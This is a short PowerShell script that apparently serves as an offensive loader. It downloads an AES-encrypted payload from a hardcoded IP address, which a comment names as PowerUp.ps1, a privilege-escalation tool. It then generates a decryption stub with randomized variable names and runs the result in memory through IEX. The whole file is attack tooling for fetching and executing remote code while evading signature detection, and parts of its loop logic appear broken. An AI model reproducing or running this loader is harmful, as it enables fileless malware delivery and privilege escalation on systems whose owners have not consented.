#decrypt an already encrypted script(PowerUp.ps1)
${6}=(New-Object Net.WebClient).downloadstring('http://192.168.147.136/file');

function Create-Var() {
        #Variable length help vary the length of the file generated
        #old: [guid]::NewGuid().ToString().Substring(24 + (Get-Random -Maximum 9))
        $set = "abcdefghijkmnopqrstuvwxyz"
        (1..(4 + (Get-Random -Maximum 6)) | %{ $set[(Get-Random -Minimum 0 -Maximum $set.Length)] } ) -join ''
}

$stub_template = ''
for ($i = 0; $i -le 10; $i++) {
        $code_alternatives  = @()
        $code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
        $code_alternatives += '${3} = {1}' + "`r`n"

        $code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
        $code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+'CBC' + "`r`n"
        $code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+'Zeros' + "`r`n"
        $code_alternatives += '${4}.BlockSize = 128' + "`r`n"
        $code_alternatives += '${4}.KeySize = '+ '256' + "`n" + '${4}.Key = ${3}' + "`r`n"
        $code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
        $code_alternatives += '${5} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
        $code_alternatives += '${4}.Dispose()' + "`r`n"
        $code_alternatives += '${6} = [System.Text.Encoding]::UTF8.GetString(${5}).Trim([char]0);' + "`r`n"
        $stub_template += $code_alternatives -join ''

        $stub_template += 'IEX' +'(${6})' + "`r`n"

        $b64key=${6}.substring(0,44);
        $b64key
        $b64encrypted=${6}.substring(44);
        $code = $stub_template -f $b64encrypted, $b64key,(Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
}
